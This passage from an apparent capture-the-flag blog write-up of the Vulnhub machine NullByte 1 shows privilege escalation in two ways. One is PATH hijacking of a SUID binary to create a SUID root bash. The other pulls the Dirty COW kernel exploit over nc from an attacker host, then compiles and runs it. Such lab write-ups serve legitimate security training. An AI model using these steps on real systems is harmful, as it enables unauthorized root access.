+</pre></table></code></div></div><ul><li>Based on this, i think <code class="language-plaintext highlighter-rouge">ps</code> is being executed</ul><li>View contents of <code class="language-plaintext highlighter-rouge">/var/www/backup/procwatch</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre> ramses@NullByte:~$ strings /var/www/backup/procwatch | grep ps
+</pre></table></code></div></div><ul><li>Strings did not reveal, <code class="language-plaintext highlighter-rouge">ps</code> being called</ul><li>Assumes it calls <code class="language-plaintext highlighter-rouge">ps</code> w/o specifying its full path<li>Exploit via Path Hijacking<ol><li>Prepend <code class="language-plaintext highlighter-rouge">/tmp</code> to ramses <code class="language-plaintext highlighter-rouge">Path</code> environment variable<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre> ramses@NullByte:~$ export PATH=/tmp:$PATH
+ ramses@NullByte:~$ echo $PATH
+ /tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+ ramses@NullByte:~$ 
+</pre></table></code></div></div><li>Create binary to spawn root shell<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre> ramses@NullByte:~$ echo "cp /bin/bash /tmp/rootbash &amp;&amp; chmod u+s /tmp/rootbash" &gt; /tmp/ps; chmod 4777 /tmp/ps;
+ ramses@NullByte:~$ ls -l /tmp
+ total 8
+ -rwsrwxrwx 1 ramses ramses   54 Feb  4 05:49 ps
+ drwx------ 3 root   root   4096 Feb  4 02:11 systemd-private-dc0b6a1de996417bb76e2cd0ae273e30-cups.service-2HAlbf
+ ramses@NullByte:~$ 
+</pre></table></code></div></div><li>Check if <code class="language-plaintext highlighter-rouge">ps</code> from <code class="language-plaintext highlighter-rouge">/tmp</code> directory is called first, before <code class="language-plaintext highlighter-rouge">/bin/ps</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre> ramses@NullByte:~$ which ps
+ /tmp/ps
+ ramses@NullByte:~$
+</pre></table></code></div></div><li>Execute <code class="language-plaintext highlighter-rouge">procwatch</code> to create root shell<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre> ramses@NullByte:~$ /var/www/backup/procwatch
+ ramses@NullByte:~$ ls -l /tmp
+ total 1088
+ -rwsrwxrwx 1 ramses ramses      54 Feb  4 05:49 ps
+ -rwsr-xr-x 1 root   ramses 1105840 Feb  4 05:50 rootbash
+ drwx------ 3 root   root      4096 Feb  4 02:11 systemd-private-dc0b6a1de996417bb76e2cd0ae273e30-cups.service-2HAlbf
+ ramses@NullByte:~$ 
+</pre></table></code></div></div><li>Obtain root shell<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre> ramses@NullByte:~$ /tmp/rootbash -p
+ rootbash-4.3# id;whoami
+ uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)
+ root
+ rootbash-4.3# 
+</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/NullByte 1/images/Pasted%20image%2020220203215116.png" alt="" data-proofer-ignore></p></ol><li>Root Flag<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+</pre><td class="rouge-code"><pre> rootbash-4.3# cat proof.txt 
+ adf11c7a9e6523e630aaf3b9b7acb51d
+
+ It seems that you have pwned the box, congrats. 
+ Now you done that I wanna talk with you. Write a walk &amp; mail at
+ xly0n@sigaint.org attach the walk and proof.txt
+ If sigaint.org is down you may mail at nbsly0n@gmail.com
+
+
+ USE THIS PGP PUBLIC KEY
+
+ -----BEGIN PGP PUBLIC KEY BLOCK-----
+ Version: BCPG C# v1.6.1.0
+
+ mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ
+ Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT
+ e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq
+ Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK
+ +z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe
+ YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu
+ Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS
+ HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q
+ m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn
+ XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58
+ kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8
+ TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU
+ Gms=
+ =PiAQ
+ -----END PGP PUBLIC KEY BLOCK-----
+ rootbash-4.3# 
+</pre></table></code></div></div></ol><h2 id="root---via-kernel-exploit">Root - Via Kernel Exploit <a href="#root---via-kernel-exploit" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Check system information<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre> ramses@NullByte:~$ uname -a
+ Linux NullByte 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt11-1+deb8u2 (2015-07-17) i686 GNU/Linux
+</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">3.16.0-4-686</code></ul><li>Search exploits for Linux <code class="language-plaintext highlighter-rouge">3.16.0-4-686</code><ul><li>https://www.exploit-db.com/exploits/40616<li>https://www.exploit-db.com/exploits/40839</ul><li>Exploit<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre> ramses@NullByte:/tmp$ nc 192.168.110.4 4444 &gt; 40839.c
+ ramses@NullByte:/tmp$ mv 40839.c dirty.c
+ ramses@NullByte:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
+ ramses@NullByte:/tmp$ chmod +x dirty; ./dirty 
+</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/NullByte 1/images/Pasted%20image%2020220204011038.png" alt="" data-proofer-ignore></p></ol></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/vulnhub/'>Vulnhub</a>, <a href='/categories/linux/'>Linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/image-forensics/" class="post-tag no-text-decoration" >image-forensics</a> <a href="/tags/exploit-sqli-database-enum/" class="post-tag no-text-decoration" >exploit/sqli/database-enum</a> <a href="/tags/linux-priv-esc-suid-path-hijacking/" class="post-tag no-text-decoration" >linux-priv-esc/suid/path-hijacking</a> <a href="/tags/linux-priv-esc-kernel-exploit/" class="post-tag no-text-decoration" >linux-priv-esc/kernel-exploit</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://www.facebook.com/sharer/sharer.php?title=Vulnhub - NullByte 1 - Yufong&amp;u=https://yufongg.github.io/posts/NullByte-1/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="" data-toggle="tooltip" data-placement="top" title="" target="_blank" rel="noopener" aria-label=""> <i class="fa-fw "></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Blunder/">HackTheBox - Blunder</a><li><a href="/posts/Attacktive-Directory/">TryHackMe - Attacktive Directory</a><li><a href="/posts/Tommy-Boy-1/">Vulnhub - Tommy Boy 1</a><li><a href="/posts/Tiki-1/">Vulnhub - Tiki 1</a><li><a href="/posts/Breach-1/">Vulnhub - Breach 1</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tcp-80-http-web-app-cms-exploit/">tcp/80-http/web-app-cms-exploit</a> <a class="post-tag" href="/tags/linux-priv-esc-linux-creds-found/">linux-priv-esc/linux-creds-found</a> <a class="post-tag" href="/tags/exploit-file-inclusion-lfi/">exploit/file-inclusion/lfi</a> <a class="post-tag" href="/tags/linux-priv-esc-sudo-gtfo-bin/">linux-priv-esc/sudo/gtfo-bin</a> <a class="post-tag" href="/tags/exploit-command-injection/">exploit/command-injection</a> <a class="post-tag" href="/tags/linux-priv-esc-kernel-exploit/">linux-priv-esc/kernel-exploit</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/exploit-sqli-database-enum/">exploit/sqli/database-enum</a> <a class="post-tag" href="/tags/pivot/">pivot</a> <a class="post-tag" href="/tags/exploit-file-upload-bypass/">exploit/file-upload-bypass</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Lord-of-the-Root-1.0.1/"><div class="card-body"> <em class="timeago small" data-ts="1643644800" > 2022-02-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Vulnhub - Lord of the Root 1.0.1</h3><div class="text-muted small"><p> Overview This machine begins w/ SSH revealing a port knocking sequence, allowing us to open an additional port TCP/1337 running HTTP. The webpage has a login page that is susceptible to SQLi, allow...</p></div></div></a></div><div class="card"> <a href="/posts/Tommy-Boy-1/"><div class="card-body"> <em class="timeago small" data-ts="1642176000" > 2022-01-15 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Vulnhub - Tommy Boy 1</h3><div class="text-muted small"><p> Recon NMAP Complete Scan # Nmap 7.92 scan initiated Tue Jan 18 04:38:15 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/TommyBoy1/192.168.56.129/sca...</p></div></div></a></div><div class="card"> <a href="/posts/Breach-1/"><div class="card-body"> <em class="timeago small" data-ts="1642953600" > 2022-01-24 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Vulnhub - Breach 1</h3><div class="text-muted small"><p> Recon NMAP All ports are open TCP/80 (HTTP) Ferox - common.txt ┌──(root💀kali)-[~/vulnHub/Breach1] └─# feroxbuster -u http://192.168.110.140 -w /usr/share/wordlists/dirb/common.txt -o /root/vu...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Prime-1/" class="btn btn-outline-primary" prompt="Older"><p>Vulnhub - Prime 1</p></a> <a href="/posts/Lord-of-the-Root-1.0.1/" class="btn btn-outline-primary" prompt="Newer"><p>Vulnhub - Lord of the Root 1.0.1</p></a></div><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> var disqus_config = function () { this.page.url = 'https://yufongg.github.io/posts/NullByte-1/'; this.page.identifier = '/posts/NullByte-1/'; }; /* Lazy loading */ var disqus_observer = new IntersectionObserver(function (entries) { if(entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://yufongg-github-io.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] }); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { /* Disqus hasn't been loaded */ if (typeof DISQUS === "undefined") { return; } if (document.readyState == 'complete') { DISQUS.reset({ reload: true, config: disqus_config }); } } const modeToggle = document.querySelector(".mode-toggle"); if (typeof modeToggle !== "undefined") { /* modeToggle.addEventListener('click', reloadDisqus); // not pretty for 'color-scheme' */ window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', reloadDisqus); } </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/yufongg">yufongg</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tcp-80-http-web-app-cms-exploit/">tcp/80-http/web-app-cms-exploit</a> <a class="post-tag" href="/tags/linux-priv-esc-linux-creds-found/">linux-priv-esc/linux-creds-found</a> <a class="post-tag" href="/tags/exploit-file-inclusion-lfi/">exploit/file-inclusion/lfi</a> <a class="post-tag" href="/tags/linux-priv-esc-sudo-gtfo-bin/">linux-priv-esc/sudo/gtfo-bin</a> <a class="post-tag" href="/tags/exploit-command-injection/">exploit/command-injection</a> <a class="post-tag" href="/tags/linux-priv-esc-kernel-exploit/">linux-priv-esc/kernel-exploit</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/exploit-sqli-database-enum/">exploit/sqli/database-enum</a> <a class="post-tag" href="/tags/pivot/">pivot</a> <a class="post-tag" href="/tags/exploit-file-upload-bypass/">exploit/file-upload-bypass</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-LS5TVPBBZE"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-LS5TVPBBZE'); }); </script>
